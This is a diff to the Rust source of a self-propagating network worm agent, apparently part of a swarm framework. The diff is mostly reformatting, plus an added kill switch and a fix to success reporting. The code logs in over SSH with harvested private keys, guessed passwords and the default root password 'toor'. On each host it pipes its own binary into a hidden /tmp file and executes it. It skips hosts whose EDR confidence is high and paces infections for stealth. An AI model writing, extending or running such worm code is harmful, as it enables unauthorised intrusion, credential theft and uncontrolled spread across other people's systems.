@@ -1,5 +1,5 @@
-use hive_base::{AgentIdentity, HiveChamber, Message, Payload, Role, Value};
 use hive_base::ml::RandomForest;
+use hive_base::{AgentIdentity, HiveChamber, Message, Payload, Role, Value};
 use rand::Rng;
 use std::env;
 use std::net::Ipv4Addr;
@@ -9,13 +9,13 @@ use tracing::{info, warn};
 // ── Auto-limitation config ───────────────────────────────────────────────────
 
 struct WormLimits {
-    max_hops: u32,              // Maximum propagation hops before self-termination
+    max_hops: u32,                   // Maximum propagation hops before self-termination
     forbidden_segments: Vec<String>, // Network segments to NEVER touch
-    stealth_delay: Duration,    // Base delay between infection attempts
-    max_infections_per_minute: u32, // Rate limiter
-    self_destruct_after: Duration,  // Auto-terminate after this long
-    _avoid_edr_threshold: f32,   // Skip targets with EDR confidence above this
-    scan_subnets: Vec<String>,   // Subnets to actively scan
+    stealth_delay: Duration,         // Base delay between infection attempts
+    max_infections_per_minute: u32,  // Rate limiter
+    self_destruct_after: Duration,   // Auto-terminate after this long
+    _avoid_edr_threshold: f32,       // Skip targets with EDR confidence above this
+    scan_subnets: Vec<String>,       // Subnets to actively scan
 }
 
 impl Default for WormLimits {
@@ -27,10 +27,7 @@ impl Default for WormLimits {
         }
         Self {
             max_hops: 10,
-            forbidden_segments: vec![
-                "10.0.0.0/8".into(),
-                "192.168.100.0/24".into(),
-            ],
+            forbidden_segments: vec!["10.0.0.0/8".into(), "192.168.100.0/24".into()],
             stealth_delay: Duration::from_secs(30),
             max_infections_per_minute: 2,
             self_destruct_after: Duration::from_secs(3600),
@@ -63,7 +60,7 @@ struct WormAgent {
     infections_this_minute: u32,
     minute_start: std::time::Instant,
     known_hosts: Vec<String>,
-    marl_state: Vec<f32>,  // RL state for hop decisions
+    marl_state: Vec<f32>, // RL state for hop decisions
 }
 
 impl WormAgent {
@@ -75,11 +72,17 @@ impl WormAgent {
 
         let limits = WormLimits::default();
 
-        info!("Worm agent active | ID: {} | Max hops: {} | Lifetime: {}m",
-            identity.id(), limits.max_hops, limits.self_destruct_after.as_secs() / 60);
+        info!(
+            "Worm agent active | ID: {} | Max hops: {} | Lifetime: {}m",
+            identity.id(),
+            limits.max_hops,
+            limits.self_destruct_after.as_secs() / 60
+        );
 
         Self {
-            comms, identity, limits,
+            comms,
+            identity,
+            limits,
             hops: 0,
             infections: Vec::new(),
             birth_time: std::time::Instant::now(),
@@ -99,6 +102,10 @@ impl WormAgent {
         let mut clean_hosts = Vec::new();
 
         for msg in messages {
+            if msg.is_kill_switch() {
+                warn!("Kill switch received - agent self-destructing now");
+                std::process::exit(0);
+            }
             if let Payload::Belief { asset, value, .. } = &msg.payload {
                 match asset.as_str() {
                     "edr_present" => {
@@ -146,7 +153,9 @@ impl WormAgent {
         // Build state vector for each target and rank by expected Q-value
         let model_bytes = include_bytes!("../../worker/models/scout_classifier.bin").to_vec();
 
-        if model_bytes.is_empty() { return; }
+        if model_bytes.is_empty() {
+            return;
+        }
 
         if let Some(model) = RandomForest::from_binary(&model_bytes) {
             for host in hosts.iter() {
@@ -230,12 +239,19 @@ impl WormAgent {
                 for (user, pass) in &creds {
                     // Step 1: verify credentials
                     let verify = std::process::Command::new("sshpass")
-                        .args(["-p", pass, "ssh",
-                               "-o", "StrictHostKeyChecking=no",
-                               "-o", "ConnectTimeout=5",
-                               "-o", "UserKnownHostsFile=/dev/null",
-                               &format!("{}@{}", user, host),
-                               "id"])
+                        .args([
+                            "-p",
+                            pass,
+                            "ssh",
+                            "-o",
+                            "StrictHostKeyChecking=no",
+                            "-o",
+                            "ConnectTimeout=5",
+                            "-o",
+                            "UserKnownHostsFile=/dev/null",
+                            &format!("{}@{}", user, host),
+                            "id",
+                        ])
                         .output();
                     if let Ok(out) = verify {
                         if out.status.success() {
@@ -243,12 +259,19 @@ impl WormAgent {
                             // Step 2: deploy binary
                             info!("Worm: deploying to {} via sshpass pipe", host);
                             let deploy = std::process::Command::new("sshpass")
-                                .args(["-p", pass, "ssh",
-                                       "-o", "StrictHostKeyChecking=no",
-                                       "-o", "ConnectTimeout=10",
-                                       "-o", "UserKnownHostsFile=/dev/null",
-                                       &format!("{}@{}", user, host),
-                                       "cat > /tmp/.w && chmod +x /tmp/.w && /tmp/.w &"])
+                                .args([
+                                    "-p",
+                                    pass,
+                                    "ssh",
+                                    "-o",
+                                    "StrictHostKeyChecking=no",
+                                    "-o",
+                                    "ConnectTimeout=10",
+                                    "-o",
+                                    "UserKnownHostsFile=/dev/null",
+                                    &format!("{}@{}", user, host),
+                                    "cat > /tmp/.w && chmod +x /tmp/.w && /tmp/.w &",
+                                ])
                                 .stdin(std::process::Stdio::piped())
                                 .spawn();
                             if let Ok(mut child) = deploy {
@@ -261,7 +284,10 @@ impl WormAgent {
                                 info!("Worm: binary deployed to {}", host);
                             } else {
                                 warn!("Worm: deploy spawn failed for {}", host);
-                                success = true; // at least creds work
+                                // Credentials verified but deployment did not
+                                // happen — reporting success here would lie
+                                // to the colony's consensus layer.
+                                success = false;
                             }
                             break;
                         }
@@ -275,7 +301,8 @@ impl WormAgent {
             "ssh_key" => {
                 // Try harvested keys
                 let keys = hive_base::harvest_credentials();
-                let ssh_keys: Vec<_> = keys.iter()
+                let ssh_keys: Vec<_> = keys
+                    .iter()
                     .filter(|(n, _, _)| n.ends_with("_rsa") || n.ends_with("_ed25519"))
                     .collect();
 
@@ -283,12 +310,18 @@ impl WormAgent {
                 for (_key_name, key_data, _) in &ssh_keys {
                     if std::fs::write("/tmp/.wk", key_data).is_ok() {
                         let output = std::process::Command::new("ssh")
-                            .args(["-o", "StrictHostKeyChecking=no",
-                                   "-o", "ConnectTimeout=5",
-                                   "-o", "BatchMode=yes",
-                                   "-i", "/tmp/.wk",
-                                   &format!("root@{}", host),
-                                   "id"])
+                            .args([
+                                "-o",
+                                "StrictHostKeyChecking=no",
+                                "-o",
+                                "ConnectTimeout=5",
+                                "-o",
+                                "BatchMode=yes",
+                                "-i",
+                                "/tmp/.wk",
+                                &format!("root@{}", host),
+                                "id",
+                            ])
                             .output();
                         let _ = std::fs::remove_file("/tmp/.wk");
                         if let Ok(out) = output {
@@ -307,12 +340,19 @@ impl WormAgent {
                 let binary = std::fs::read(&current_bin).unwrap_or_default();
                 if !binary.is_empty() {
                     let deploy = std::process::Command::new("sshpass")
-                        .args(["-p", "toor", "ssh",
-                               "-o", "StrictHostKeyChecking=no",
-                               "-o", "ConnectTimeout=10",
-                               "-o", "UserKnownHostsFile=/dev/null",
-                               &format!("root@{}", host),
-                                       "cat > /tmp/.w && chmod +x /tmp/.w && /tmp/.w &"])
+                        .args([
+                            "-p",
+                            "toor",
+                            "ssh",
+                            "-o",
+                            "StrictHostKeyChecking=no",
+                            "-o",
+                            "ConnectTimeout=10",
+                            "-o",
+                            "UserKnownHostsFile=/dev/null",
+                            &format!("root@{}", host),
+                            "cat > /tmp/.w && chmod +x /tmp/.w && /tmp/.w &",
+                        ])
                         .stdin(std::process::Stdio::piped())
                         .spawn();
                     if let Ok(mut child) = deploy {
@@ -399,14 +439,20 @@ impl WormAgent {
                 } else {
                     "lifetime expired"
                 };
-                info!("Worm: self-destruct ({}) | {} hops, {} infections",
-                    reason, self.hops,
-                    self.infections.iter().filter(|i| i.success).count());
+                info!(
+                    "Worm: self-destruct ({}) | {} hops, {} infections",
+                    reason,
+                    self.hops,
+                    self.infections.iter().filter(|i| i.success).count()
+                );
 
                 // Notify swarm before dying
                 let msg = Message::status_event(
-                    self.identity.id(), Role::Worker,
-                    "worm_terminate", self.identity.id(), Role::Worker,
+                    self.identity.id(),
+                    Role::Worker,
+                    "worm_terminate",
+                    self.identity.id(),
+                    Role::Worker,
                     reason,
                 );
                 self.comms.publish(msg).await;
@@ -429,8 +475,12 @@ impl WormAgent {
 
             // Infect opportunistic targets
             for host in &targets[..targets.len().min(3)] {
-                if self.should_self_destruct() { break; }
-                if !self.rate_limit_ok() { break; }
+                if self.should_self_destruct() {
+                    break;
+                }
+                if !self.rate_limit_ok() {
+                    break;
+                }
 
                 let state = self.infect_host(host).await;
                 let was_no_ssh = state._method == "no_ssh";
@@ -457,11 +507,24 @@ impl WormAgent {
 
 fn host_in_cidr(host: &str, cidr: &str) -> bool {
     let parts: Vec<&str> = cidr.split('/').collect();
-    if parts.len() != 2 { return false; }
-    let prefix_len: u8 = match parts[1].parse() { Ok(n) => n, Err(_) => return false };
-    let cidr_ip: Ipv4Addr = match parts[0].parse() { Ok(ip) => ip, Err(_) => return false };
-    let host_ip: Ipv4Addr = match host.parse() { Ok(ip) => ip, Err(_) => return false };
-    if prefix_len == 0 { return true; }
+    if parts.len() != 2 {
+        return false;
+    }
+    let prefix_len: u8 = match parts[1].parse() {
+        Ok(n) => n,
+        Err(_) => return false,
+    };
+    let cidr_ip: Ipv4Addr = match parts[0].parse() {
+        Ok(ip) => ip,
+        Err(_) => return false,
+    };
+    let host_ip: Ipv4Addr = match host.parse() {
+        Ok(ip) => ip,
+        Err(_) => return false,
+    };
+    if prefix_len == 0 {
+        return true;
+    }
     let mask = u32::MAX << (32 - prefix_len);
     (u32::from(cidr_ip) & mask) == (u32::from(host_ip) & mask)
 }
